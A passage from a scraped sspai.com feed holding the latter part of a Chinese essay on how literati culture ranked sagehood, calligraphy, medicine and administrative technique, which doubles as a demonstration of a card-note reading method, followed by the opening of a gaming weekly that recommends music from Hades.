景的「医圣」形象是如何一层一层叠加上去。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/8266943c5584ae32284dac29507b5b25.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片6</figcaption></figure><p>简而言之，汉代名医张仲景在宋代地位大升，被当时医学界开始称作「亚圣」，说他比诸儒家圣人孔子周公虽然不完满，但也极度接近了。到明朝时，刻印出版的各种以古今医史为主题的书籍增加，1556 年，有人直接叫他「医圣」。此书一出，后面的各种医书纷纷说：「张仲景，南阳人，后世称为医圣」，可谓「自我作古」。更有趣的是，从东汉到宋以前，没有任何文献或残篇提到张仲景被举过孝廉或曾任长沙太守，而宋代之后，人人都知道这位东汉名医不只是医生，还是孝廉出身的长沙太守。清代一位著名的苏州医生陆懋修给张仲景补修过传记，先讲到举孝廉，便加上几笔说他在家的时候又仁又孝又廉又能，再讲到做太守，便补充描述说他在郡的时候有不少治理的美谈，甚至按照东汉原装习惯，加上了一句「时人为之语曰：医中圣人张仲景」。</p>\n<p>这张卡片如果用扑克牌的西洋叫法，堪称 Wild Card （百搭牌、鬼牌）。拿它起个头，去讨论「层累的历史」这种理论什么时候好用什么时候不好用也可以，去对照着看武圣人关公一层层头衔是怎样加上去的也可以，去跟国粹迷们讲很多传说故事本身不大可靠也可以，去看看宋代、明代为什么印刷书籍的影响变得那么大也可以，甚至拿着网络小说当中的「十二祖巫」设定被人当成古代神话这件事对照着笑一笑也可以。但是，不把它拿回去跟前面封着盘的那堆问题再比量一下，不就太浪费了吗？</p>\n<p>把画圣与医圣对齐，一个疑问顿时浮现：为什么张仲景非得是长沙太守？在没有任何可靠材料甚至线索来给这个长沙太守提供一点点可信度的前提下，只好做这么一个推测：医圣（亚圣）必须是二千石官员，这才算得上体面，那些宋人可能真心这样想。</p>\n<p>不过画圣、医圣这两个称呼并不是唐宋时候才被创造出来的新词。在吴道子成为画圣、张仲景成为医圣之前很久，「抱朴子」葛洪就已经提出了这两个称号。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/16b7bbbd52914ba98836ccb4e52afcb6.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片7</figcaption></figure><p>葛洪生于西晋，死于东晋。比韦诞晚，比王献之早。但在他的名篇《抱朴子·内篇·辨问》里讲了几句话，观念就和六朝一切主流完全不同。他讲：普通人做不到的事情，某人做到了，那他就是圣人。围棋举世无双的是棋圣，写字一时之绝的是书圣，绘画过人的是画圣，木工活做得超乎常人的是木圣，鲁班之流是机械之圣，扁鹊之流是治疾之圣。此外还有卜算之圣、筋力之圣、勇敢之圣、轻速之圣、知音之圣、用兵之圣。圣这个字只不过是用来称呼人间极致的事情，不只是儒学独占。</p>\n<p>前述文字，其实是为了掩护葛洪自己的论断：圣人的圣，并不是一种无所不包的抽象品质，不同的事情上有不同的圣人，那么，除了周公孔子这种治国之圣之外，善于道德至神仙者，也就是得道之圣，毕竟说起来，神仙秘术，周公孔子也未必知道。他又假设有俗人会这样质问：谁说「圣」不是无所不包的？谁说周公孔子不知道你那套神仙道术？他们只是不屑于用罢了。于是葛洪如此妙答：「必不求之于明文而指空以空言者，吾便可谓周孔能振翮翻飞，翱翔八极，兴云致雨，移山拔井，但不为耳。」</p>\n<p>上面这句话，翻译成现代语言，就是卡尔萨根那著名的反伪科学段子——「我的车库里有一头透明的喷火龙，现代一切检测手段都看不到它。你凭什么说它不在那儿。」葛洪是两晋第一流可爱人物。</p>\n<p>可这位老神仙把局面弄得更加复杂了——既然早早就有人提出了木工有木工的圣人，机械有机械的圣人，为什么把看病、写字和画壁画当作职业在漫长岁月中仍然是一件被打上「卑下」标签的事情呢？究竟是什么样的力量与这种堪称做「圣人平等」的观念做了对冲，使之经历千年而无声无息？于是，张仲景的医圣与长沙太守这双重身份内在的冲突抵牾，仍然期待着能有一个解释或一条线索。</p>\n<h2><strong>六一居士重何物</strong></h2>\n<p>有一部书叫做《太平御览》，是宋太宗让人编修的类书。所谓类书，略微有些像近代以来的百科全书，条目却不像今天百科全书那样会由作者一条条撰写。类书的做法是先定类目，比如「职官部」、「鬼神部」，然后把所能找到的图书当中相关的段落文本抄录成条，分类编入。此书一方面固然反映着编修者自己的「编辑眼光」，更多地是能够显现在那个时候修书人能够收集、阅读到多少历代文献。哪个条目下引文更丰富，则说明从有汉字以来到宋太宗时代谈论过这个主题（并且没有散佚、火烧）的文字更多，在想象中读书人共通的知识世界里的位置也更重要。而同样一段引文，被归在甲部还是乙部，就要看编撰者自身的观念（自然也是他所在的文化传统的影响之中）如何理解一个故事、一种事物的本质。</p>\n<p>如果不计较原创和引用的差别，《太平御览》的编目精神其实和《世说新语》、《颜氏家训》一脉相承。韦诞高空写字的故事，在《世说新语》是「巧艺」篇，在《颜氏家训》是「杂艺」篇，在《太平御览》，则是「工艺部四」当中的「书·上」条（引用的正是世说新语当中的记载）。书法相关的文本繁盛得很，在工艺部中一连用掉了四、五、六三卷，画用掉了一卷半。那么我们今天说的那个「工艺」，比如浑天仪、木牛流马等木工、机械、战争技术、工程等等事物有几卷？很可怜，这些加在一起，只需要一卷就全部记下，并且条目也不再细分，被归为一个，叫做「巧」。当然，也有一些我们今天以为是关于工艺的事情，被《太平御览》的编撰者放到别的条目当中去了。比如大名鼎鼎的三国军事装备「霹雳车」，就不在「工艺」部中，而是被列入「兵」部。</p>\n<p>习惯今天社会生活的人很难习惯这种轻重对比。抱朴子不是早早就说过木工、机械都可以有圣人吗？诗赋里不是有南朝四百八十寺的楼台和秦始皇的复道行空吗？这么多年来，这些技术就一直没有人当回事，或者是被认为不值得被仔细写在书籍中的吗？而书法相关的却有那么多，都已经被归为「杂艺」了，当中还要细分等级对吧？</p>\n<p>书法的确地位可高可低，北宋时有两位第一流的学问家为此专门通信辩论过。一位是论文论史都绝不能不知道的欧阳修，一位是在儒学历史上开创理学先声的徂徕先生石介。开启争论的是欧阳修，他写信给石介说，在别处见到先生你的书信，我被字迹深深震惊，拿着请教别人，别人都说写成这样还能是什么原因？就是想故意跟世人不同而已！你先生现在在学校就职，这样子做是否合适呢？</p>\n<p>石介除了儒学上的声望，在朋友交际和政治生涯中也是个出名死拗的狠角色，当即回信，言辞如石：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/2c2fa5dbd6f79ca62faf1d331563a669.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片8</figcaption></figure><p>这是在说我书法的确不行，但我坚守圣人正道。后面的议论更加凶狠：古代圣人有周公孔子，大儒有孟子杨雄，贤圣有皋陶伊尹。如果不修德行，整天握着这数寸枯竹半握秃毫有什么光彩可言？写字不过就是六艺之一罢了，到了钟王虞柳之流的水平，也不过是守在君王左右一句吩咐就去写几个字而已。古代的圣人大儒那么多没听说过谁专长是书法，书法出名的钟王虞柳跟他们怎么比？我能传圣人之道就够了，欧阳永叔你管我怎么写字？</p>\n<p>石介着实是直言不讳的人。他激愤之时既不会给朋友留情面，也不会顾及古人声名。试想钟繇、王羲之、虞世南、柳公权，在士大夫的主流观念中，哪个不是修养风雅的代名词？间或有人议论他们之间的高下，从没有人会如此直截了当地说书法本身算个甚么。于是他的想法也就再无遮挡——重要的是圣人之道！是政治！除了治国之道之外的小小技能，我连拿来消遣都没兴趣。这种观念即使在儒者当中恐怕也是颇为极端（他如果遇到葛洪宣称「圣人不止一种」，恐怕不免白刃相向）。</p>\n<p>但谈政治又如何？很稀奇么？甚至连王羲之本人必要的时候也会谈政治。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/e3cbaac36f37bac374181e201a6c22de.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片9</figcaption></figure><p>王羲之与谢安一起登高，谢安开始玄谈。王羲之去世很早，因而此事发生时，谢安距离成为淝水之战中不动声色看小儿辈破贼的自己还要起码二十年。或许他实在是过于像隐士多于大臣，连王羲之都有些不堪忍，于是劝诫说现在时局多艰，你想想夏禹和周文王这些圣贤罢！为天下做事情是要让自己劳苦的。老是虚谈、浮文，着实不是现在该干的事情！但谢安的回答我们更需要看仔细了：「秦任商鞅，二世而亡。岂清言致患邪？」</p>\n<p>首先须知经过汉代朝野对秦的数百年批判，不论是出于士人的常识，还是基于儒家的理念，商鞅早已彻头彻尾成为恶政的象征。虽然商鞅自己是秦人杀死的，但后世很长时期里，商鞅就是秦，秦就是商鞅。如果说常人理解的谈政治就是先王和圣人（周孔）之道，那么商鞅就是「反政治」。</p>\n<p>不愧是谢安。他并不是简简单单复述一次当时人的普遍观念，反而是把商鞅当作王羲之所批评的虚谈、浮文的反面镜像来讲。言下之意——要谈政治是吧？要劳苦自身是吧？像商鞅那样精打细算、事事立法，让秦国百姓全民劳苦，怎么两代就亡国了呢？</p>\n<p>我怀疑他那时心里承认商鞅本可以是个治国的贤人，只可惜过于「职业」。两者的区别就好像王羲之与刻碑匠。治国、政治当然有许多琐碎绵密的事情要做，但六朝名门的高才们不可能为这些琐碎绵密之事牺牲自己的趣味与生活方式。商鞅的「非儒家」属性对于东晋时代的政治而言并不算多碍眼，毕竟政治伦理议题在秦亡后数百年早已经换过了好几轮。然而跟书画成为「职业」便毫无地位可言一样，政治一旦涉及「职业」和「技术」的烦扰，也同样变得毫无吸引力——比如在南朝，官职还要分清浊。从长时段来讲，当然是基于传统，门阀们偏好的职位渐渐被定义为清，门阀们厌弃的职位渐渐固化为浊。但论及本源，恐怕就少不了上述因素的影响。国子祭酒是清。著作郎秘书郎是清。尚书郎、御史台诸官是浊。为什么？前者仿佛只是一种学问的荣衔，几乎不像是屈身朝廷。而尚书郎、御史中丞之流需全天候处理朝堂种种文书事物，劳苦是真的劳苦，过于像朝廷的「雇员」。《Yes, Minister》这部电视剧里，英国内阁的秘书们把民选大臣（政客）看作业余人士，殊不知换成谢安的时代，做一个业余人士才是朝堂真正的荣耀所在，而专业人士如内阁公务员，那是不入流的人物容身之所。</p>\n<p>现在不妨理一理新抽取的卡片。谢安、石介所表现出的两种观念，又恰好占据了两个极端的位置。一种是彻底排斥「商鞅」那种事无巨细均有法令、以律条和绩效衡量一切事物的纯然职业化与技术化的政治，固然需要治国安天下，却绝不可以以放弃优游清谈为代价。另一种是完全否认周孔圣人之道之外还有什么值得追求的杂艺，那些说到底不过是不足论的「应用技术」而已。这不是很有趣吗？假如他们俩有「应用技术」这个词可以用，东晋人谢安一定觉得那就是商鞅所象征的事物，治国不应该「形而下」到那种程度。宋人石介又觉得（谢安一定会欣赏的）书艺才是「应用技术」，在儒学大道面前不值一提，哪怕不写碑不卖字身居高位也同样如此。也就是说，虽然他们两位的知识背景与信仰状况差别很大，出身地位更是绝不相同，却好像头脑有一种共通的结构：世界上总有一些某些知识、技能、行动方案、评判标准很碍眼——并不是本质上坏，而是比起自己所热衷、依靠的那部分知识、修养、目标、价值观来，低等一些、劣质一些、将就一些，仿佛方便面之于米其林餐厅。</p>\n<p>而欧阳修既不同于王谢那种六朝高门的习气，又不像石介那样激烈执拗偏于一端。在我们所熟知的唐宋八大家身份之外，他还是庆历新政的重要人物。比诸石介，他固然多花了不少心血在书艺上，而与谢安一比，又显然算得上踏实劳苦的能臣了。在他上书言事的劄子里所讨论的事项，从某一群盗贼如何捕捉，到推荐布衣之士苏洵，无所不包。这样的人物脑子里也有上述那种共通结构吗？在「政治」、「治国」这桩事情当中他觉得什么是米其林，什么是方便面？</p>\n<h2><strong>方田均税在谁手</strong></h2>\n<p>受今天社会政治事件与历史基础教育熏陶的人们，一说起宋代的改革，多半直接会想到赋税之类，我也不例外。欧阳修的文集中收录两则与庆历新政中「方田均税法」相关的劄子：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/f1e553a0d3d02bad9022b487601dae79.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片10</figcaption></figure><p>这张卡片摘录他前后两次关于方田均税法的上奏。所谓方田，只不过是官府派人实地测量农田，以一千步的长度为边长，这样一个矩形地块称作一方，再评估这一方农田当中的土质高低，分等级来换算某地块对应的赋税数量。第一则劄子是建议朝廷采用这个方法来公平分配农田税赋，第二则劄子却是申请撤销此法。庆历新政的成败有许多复杂的人事政局纠葛，远远不是我随便几句就能够概述的，不过仅仅看欧阳修在第二则劄子里面解释方田均税应当撤销的纸面理由，大略是这么些：</p>\n<p>有地方测量出了大量原本没登记的农田，官府却不降低每方土地均摊的赋税标准，反而增加了赋税总额。</p>\n<p>有地方把历史上的赋税坏账也摊进去要求一起计算。</p>\n<p>有地方把完全没法种植的土地也量出来要求所有者交税。</p>\n<p>于是欧阳修喟叹：有小人言利不言害，有俗吏贪功见小利忘大害，都是他们的错，越均负担越重，现在亡羊补牢别均税了吧。等等！欧阳公，一个郡县制国家颁布影响全国的税制法令时，就没有人反复斟酌细则防止漏洞或滥用的吗？难道朝廷里的正人君子不用考虑行政细节，这些都是留给所谓小人俗吏的？</p>\n<p>早年间读过黄仁宇的著作，他所分析的具体事例完全忘光再不记得，但那著名的论断——「中国古代国家缺乏数目字管理」，在此刻突然又冒了出来。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/8b52ca9a2c8bb708e55f398089a2c8a4.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片11</figcaption></figure><p>黄仁宇说到了苏绰，这是南北朝末端最杰出的头脑之一。宇文泰就是依靠着他建立起新国家的骨架，导向了其后的隋唐制度。苏绰擅长数学，又一手编订了西魏国家的财政收支与户籍赋税制度，黄仁宇却批评他说这种数学不是真数学，是先拿《周礼》当中理论性的设置当作模板，指定一套符合理念的数字组合，再去让实际的社会、国家运行贴合这套数字。</p>\n<p>太像纸牌接龙了，我立即想起手中的另一张卡片。那是前些天读斯科特(James C. Scott)《国家的视角》(Seeing Like a State)时见到的一些段落。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/8f89256d2c99a2ac4228ad4dd6f623d5.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片12</figcaption></figure><p>不用读完全书，只需要稍稍多翻一两个章节，读者就会发觉斯科特的重点绝不是在赞扬这种方法以及背后的统计学。但也不能否认区分古代国家和近代、现代国家的一根细细线条几乎就在于此。合理采样、精准计算、正确统计，近代国家的财政制度终于能够直接、明确地掌握土地和森林里蕴含着的（它所需要的、可利用的那一类）财富数额，由此编订到收支计划当中去。从此再进一步，根据斯科特的说法，则是要把糅杂的、多元的自然界与社会通过国家的强力转换成单一的、标准的、即开即用的资源。</p>\n<p>话虽如此，当你看到近代的森林统计员肩并肩前进拿着五种颜色的钉子往树上钉时，真的不会联想起宋代方田均税时那些朝着四个方向各走一千步然后把这块田地标记为四种等级之一的小吏吗？其间数学与统计的技术差距当然可想而知，不过用外行人粗糙的眼光来看，两种行动的外壳又何其相似。我们所能知道的区别只在于前者一次又一次失败，后者则参与塑造了今天我们不一定完全乐于接纳却无从逃避的现代世界。假如（并没多少把握），一定要把宋代的土地测量员和近代德国的森林统计员所作的事情摊在同一张桌子上——这正是卡片的若干好处之一，我大可试探性地摆摆看，弄错了还可以收起——或许我可以给他们一个共通的名字：统治的技术（固然这些技术背后的思想与数学背景南辕北辙）。</p>\n<p>以这种眼光去看，则欧阳公与方田均税这整个事件的联系，都只是像一个远远打探而未到现场的新闻记者。实际使用、打磨切削这种（像是手工作坊的）统治技术的人，并不是他这种兼具圣人之道与治国热心的士人官僚。当他把均田而引起骚动（或许他们当真滥用了这个法令，或许没有）的责任人称作「小人、俗吏」时，就很明白地告诉了我们在他心里什么是米其林餐厅而什么是方便面。当「国家」（也即是朝廷中枢的那一群人）讨论这一类问题的时候，到哪一个程度为止才不会让身上沾染尘土油污，是有不约而同的答案的。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/d7d680ee693e293dd30141446fa230f7.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片13</figcaption></figure><p>这张卡片算不得论证，将将能给上述的印象加一份注脚。黄易是清后期一场围绕古代碑刻兴起的文化潮流及交往网络的中心人物，他甚至发现了湮没无闻的武梁祠（数百年后，现代人巫鸿又用一篇《武梁祠》带动了中国艺术史研究的新范式）。黄易绝不忌惮行走千里访碑的辛劳，也极度重视碑刻拓本的质量，但他除了极度必要时，不会自己动手去拓一张纸一个字。</p>\n<p>说到这里，大致上已经可以给前面的种种问题做一个回顾了——每一张关于古代中国的卡片里，之前所说的那种共通结构仿佛一直存在。当事人身份各不相同，所贬抑的对象也随时转移，但就好像有一个不死的魂灵一直在转世重来。身为清贵之人，就要远离烦杂政务并避免堕落成职业书法家、画家。身为科举官僚，则不能用土地统计的细节在朝堂上讨价还价。身为古碑的鉴赏家，也不能因为拓工的技能不如自己就亲自动手。有一句成语「越俎代庖」，以前单单理解成多管闲事的意思，原来如此，原来如此。</p>\n<p>这些被贬抑的、被排斥的技术终究需要人去使用，只是在古代国家的叙述脉络里并不会有很大的声音。就像是在某些巨大城市的中心区域里你看不见货物被如何分拣、电流从哪儿传输、污水被怎样引流，只能察觉到最为末端的一小部分，但它们始终就在那里。</p>\n<h2><strong>看不见的技术</strong></h2>\n<p>已故的新加坡开国总理李光耀是个辩才无碍的人，但我对他的思想全无兴趣，除了他与邓的一段对话，别无其它印象：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/c0439bfd991f3498256d9cb5a46e3bec.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片14</figcaption></figure><p>自很久以前见过这段话以来，我的脑中总有这么一个感慨：原来天下的事情不妨分成「农民的后代会做的」跟「文人学士的后代会做的」两种。 此刻把这张卡片唤出，放上桌面，这种感慨有了一种更具体的指向：当文人学士们一代代传承着圣人之道、学问文章、治国理政、闲情逸致的知识时，打铁养马、斫木制器、烧陶作瓷这些技能、知识、职业，也是（主要地）由一代代的农夫与工匠继承着。测量土地、编订与使用户籍、把圣人之道投影而成的法令规章律例转换为日常生活中种种实际行动路线的技术，则是服务于各个地方官府的吏员世代传递。这些技术是看不见的，仅有在少数特殊时刻才能进入文人学士的视野，一次次地像突然遭遇的异类一样被他们重新「发现」。</p>\n<p>记得《木兰辞》么？军书十二卷，卷卷有爷名。木兰是什么人？军书又是什么？后世的研究者要用尽想象力去推测其中提到的细节来源于哪种制度，所述的故事又对应着哪一个群体。《木兰辞》之外，魏晋那些「士家」、「部曲」的生与死，北朝到隋唐的「府兵」的日常悲与欢，本在文字的书写范围之外，我们所能看见的，仅仅是一条条制度设立与撤销的记载加上一场场战役的胜败。倘若没有《木兰辞》这道无比偶然的闪电，或许后人更加不会去想象那时的一个服役者上战场前要怎样准备他的战马、从哪儿购买他的鞍辔。但《木兰辞》仍然是一个不知名的文人学士把一个或许来自普通人之口的故事雅化的产物。直到之后很晚的时代，普通士兵及其家庭的想法才第一次不经他人之口出现在文字当中。这是我从宋怡明对明代军户的研究中见到的。</p>\n<p>民户的赋税与劳役、军户的征发与补充……这些事务在遥远的朝廷与「文人学士的后代」眼里，是一条条严密规整的章程。在实际征集一石粮食、一次夫役、一名正军的下层官吏手中，则是「看不见的统治技术」——在维持书面上的人口与赋税水平大体不变的前提下，把赋税劳役分配给谁？在一个庞大的军户家族当中，究竟应该选择哪一个分支出人服役？</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/08/49dfb368a1cdc53b6fba9555ede4f6b9.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片15</figcaption></figure><p>这张卡片，是宋怡明观察分析传承至今的明代军户家庭族谱与契约后发现的一条线索。国家会索取军户的服役义务，官吏则会让抽象的律条变成随时可能闯入日常生活的威胁。在这种「看不见的统治技术」面前，被统治者并非普通想象中纯然被动的角色。15世纪以来明代社会中商业的影响大增，东南地方的这些军户家庭能够更为熟练地计算一份服役相当于多少土地的产出，设置专用于供养服役军人（及后裔）的族产、签订契约规定服役的年限与补偿……利用这种来自于商业世界的经验，他们发展出了自己的「被统治的艺术」。把不可控的来自国家制度与官吏个人的风险，用家族结构与合同契约的方式加以稳定与平衡。</p>\n<p>「被统治的艺术」，放到我们眼前摊着许多张卡片的这个语境当中来，或许更适合被叫做「被统治的技术」。在珠江三角洲有一种河流冲积而成的土地叫做沙田，由于沙田不是从来就有，而是随着时间推移一点点增加，那么这种田土以及在上面开垦劳作的居民究竟是什么身份，就颇为暧昧。为了让自己成为「合法的被统治者」，来确保对新开垦沙田的占有，三角洲居民采用了建立宗族、修订族谱之类的手段。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/09/c6687b5c0fade521544587b4026064ea.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片16</figcaption></figure><p>修族谱并不是简单的事情。在浙江温州的瑞安平阳一带，就有专门的「谱匠」群体，从明代传承至今。是采用「欧式（起源自欧阳修）」还是「苏式（起源自苏洵）」？使用怎样的木活字印刷出来才更为庄严？世系图的连线怎样画？高祖以上不知何许人也，该如何连接上鼎鼎大名的同姓古人？这是不折不扣的技术无疑。</p>\n<p>这种技术甚至被使用到了远离本国的地方。下图是连成一排的三张卡片。最右一张，是我去年读书时留意到的有趣现象。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/45a6e35d6c73375aadf4bc697f6414d0.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>卡片15、16、17</figcaption></figure><p>卡片引文里提到的，是一群来自福建的移民，在马来西亚的槟榔屿购置地产一事。唯一不寻常的，是这份地产的产权人——早早在唐朝安史之乱中死去的两位名人。这二位「福侯公」是福建海澄县三都石塘社谢氏宗族所敬奉的神灵。在老家，拜（自家宗族信奉的）神灵近乎拜宗祠。在海外，用神灵的名义登记土地产权，也就实现了建立族产的功能。此时槟榔屿是在英国治下，以英国式的产权制度糅杂宗族内在的「合资」需求，可以算是「被统治的技术」升级版本。</p>\n<p>「农民的后代」与「文人学士的后代」之间原本有着极为鲜明的界限。一边，是文字记述的主体。一边，是看不见的混沌。但明代以来世界的格局有了前所未见的转移，原本的边疆蛮荒之地，竟然成为了连接更广大天地的港口。进而种种在原本天经地义的视角当中被贬抑、排斥、远离的事物，在主流观念当中却日渐变得至关重要。</p>\n<p>当然，这样的变化不可能是齐头并进，但趋势就像春天里嫩叶长成的速度一样，总有某个地方会先被人所注意到。回看一下最初的那个问题：沈周是谁？</p>\n<p>沈周没有科举功名，没有官职，也没有数百年传承的名门高第。但他身处明中叶社会蓬勃复兴的苏州地区，此时书画的欣赏者或客户，已经远远不止是宫廷或六朝王谢人家。官僚、士人、商人乃至一部分市井百姓近乎平等地具备了对书画的鉴赏技能——也即意味着一个前所未有的艺术市场开始成长。因而沈周不再像古代的前辈那样只有经由单一的途径可以获得声誉。</p>\n<p>沈周老年的某一天，遥远的印度洋上，葡萄牙人达伽马船队到达印度西南海岸上的卡利卡特（今天叫做科泽科德），从西欧出发到东南亚的贸易线路即将从此拉开大幕。其后世界的变化，不需要我来多讲了。</p>\n<p>1906年，清朝中枢终于做了一次机构大改革，设立邮传部。从此，船舶、邮政、道路、电讯种种事物，进入了国家视野的中心。从此开始，历经多年，关于「哪些知识是重要的、哪些是无关紧要的」的认知终于天翻地覆地调转过来了。但在新的世界图景里面，我们的头脑是否仍然承袭了那种千百年来的共通结构？这种结构的两个位置又由哪些事物来占据？这个问题仍然值得自省。</p>\n<h2><strong>说明</strong></h2>\n<p>我自己设计了一种「卡片笔记」方法，上面这篇文章，其实是对「卡片」这种工具的一次演示。一共使用了 16 张卡片。其中 1，2，3，6，11，12，13，14，15，16 是原本就在我的卡片库当中，或者是脑子留有印象，用到时就临时去找到原文制作出来的。而 4，5，7，8，9，10 则是一边写一边带着问题去翻书时新找到的。是先想好了一个主题然后一点点搜集证据来写的吗？不是。从「沈周」的那则故事开始，我是让想法尽可能模拟日常读书时候的路径，让它不带地图，直接四处冒险，看最后能否走出不同书籍构成的迷宫。幸好，是勉强走出来了。</p>\n<p>读者在无尽的书海当中，的确是微不足道的一个旅行者。心中时时带有一定的问题，也的确是寻找方向的好用工具。但我绝不是建议说脑中应该只有单一的一个问题，要朝着这个方向走出道路来。演示终归只是演示，日常读书，大可同时有许多个问题的兴趣，随时放下，也随时拿起。如果不是这样，我的卡片库岂不是要变成了某几个具体问题的专用工具套装？</p>\n<p>把日常积累的卡片当中的某些按照自己直觉的关联放在一起，就形成了一个个卡片桌面。但一个卡片桌面绝不是为了一篇文章而存在的——下面附着的一张大图就是个反例。这是我写本篇所用到的 16 张卡片，按照大致的关联和行文的顺序放置。但阅读、思考自然积累的卡片桌面上，当然会有一篇文章所包纳不住的更多内容！</p>\n<p>每张卡片的位置不应该是固定的，正如每一天我们所遇到的问题都各不相同。在一个语境里面，卡片 A 会呼唤卡片 B。在另一个语境里面，它又会和卡片 C、D 编组，供你尝试新的方向。那么「问题」在其中的功用是什么呢？</p>\n<p>「问题」是阅读和学问的根本。撇去对于思考本身完全没有兴趣只靠着未来收益而努力的那群人不提，推动着你不停歇地探寻学问的，是已知的、被写下来、被记忆的那些关于「知识」的陈述句吗？不，是仿佛确定无疑的陈述之外、你心里时时会自然产生的「真的吗？为什么？还有呢？」之类「问题」。</p>\n<p>「1492 年哥伦布开始了他的大航海」，这是常人所说的「知识」，却不足以驱动你去了解此时西欧造船的工艺、此后南中国海上的新贸易路线。</p>\n<p>「为什么哥伦布航海之后，中国的白银使用变得那么频繁」，这是一个问题，它才是能够推着你去远望四周的真正动力。</p>\n<p>这一篇文章的用意也在于此。它是不可能一下子就讲清楚卡片方法的真实全貌，但稍稍能够说明被问题推动着翻检记忆与读书是怎样的一种状态。在《作者的宇宙》当中，我这样写：</p>\n<blockquote><p>这是读者的真正价值所在吧。在好奇中，在漫游中，在翻查中，不同时空的文本被唤醒继而共鸣。再回头看《彩虹尽头》当中温斯顿讲图书馆的那句话吧：「我找到了相关主题的书。我找到了我从未想过要问的问题，以及它们的答案。这些答案把我引向新的方向，而这些方向通常比我原本想的更有价值。」现在注意到了吗？「我」，一个行动者，才是整个结构中关键性的力量。</p></blockquote>\n<p>在这里，我请你旁观了一次让不同时空的文本被逐个唤醒、共鸣的过程。但这还远远不够。更好的方法是由你自己来成为主体，从一张卡片开始，积累、排列、猜测、验证、讨论，用你自己的问题去开启一次冒险。</p>\n<p>正如《作者的宇宙》始于回答十三岁的小朋友的问题，我也准备着开始若干次小小的课程，邀请已经能够熟练阅读而好奇心未曾被庸俗的教学所磨灭的年轻人来参与。主题是不分具体科目的人文社科入门，方法则是基于卡片笔记的阅读与论辩训练。有兴趣，自然很好；有疑惑，同样欢迎。期待你的声音。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/dfc553f0768a8fb092de7e2dc061fb37.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><hr>\n<p> </p>\n<p> </p>\n<p>注：如果你想自己重新排列、观察、评估我提到的这16张卡片，或是要追溯到原文的语境，可以用浏览器（最好是电脑的）<a href=\"http://wannengkapian.com/space/reader_universe.html\" target=\"_blank\">点击这个链接</a>，也可以直接添加我的微信 zhengteam 一同探讨。</p>\n","link":"https://sspai.com/post/67860"},{"title":"瞎玩菌的游戏周报：独立游戏哪家强？御三家新游齐亮相","date":"2021-08-13 06:29:40","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>2021.8.13 尽量每周五更新</p>\n<p>《瞎玩菌的游戏周报》是我对游戏领域的观察和点评。具有以下特点：</p>\n<ul>\n<li>宁缺毋滥，为读者带来价值</li>\n<li>主观，但基于事实和数据</li>\n<li>有新鲜感，但时效性不强</li>\n<li>享受游戏，但反对沉迷游戏</li>\n<li>提升品位，但反对鄙视链</li>\n</ul>\n<h2>享乐</h2>\n<p>「享乐（yuè ）」版块是为了推荐好的游戏音乐，「享」字体现「分享」音乐和「享受」音乐两重意思。我衷心希望也许有人因为音乐从而对游戏产生兴趣（我就是）。也欢迎读者评论推荐你们喜欢的游戏音乐，我将会在后续的游戏周报中分享。</p>\n<h3>《Good Riddance (Eurydice Solo)》 - Darren Korb, Ashley Barrett</h3>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/11/7262cae567aa06fd63516df8c7b8904b.jpg\"></figure><p>这是来自游戏《黑帝斯》（Hades）的原声音乐，这款游戏于游戏周报发布的当天（8 月 13 日）登陆 Xbox Game Pass（还有 PS4 / PS5 平台），已有会员资格的玩家可以立即下载开玩。</p>\n<p>你可以在 <a href=\"https://supergiantgames.bandcamp.com/track/good-riddance-eurydice-solo-feat-ashley-barrett-2\">Bandcamp</a> | <a href=\"https://open.spotify.com/track/5gQTdwbLvhRHtMcyWxl3y2?si=89cbc9ed4a444f53\">Spotify</a> | <a href=\"https://i.y.qq.com/v8/playsong.html?songid=285113481#webchat_redirect\">QQ 音乐</a> | <a href=\"https://music.163.com/#/song?id=1498595177\">网易云音乐</a> | <a href=\"https://music.youtube.com/watch?v=GyBmvMIGppY&amp;feature=share\">YouTube Music</a> 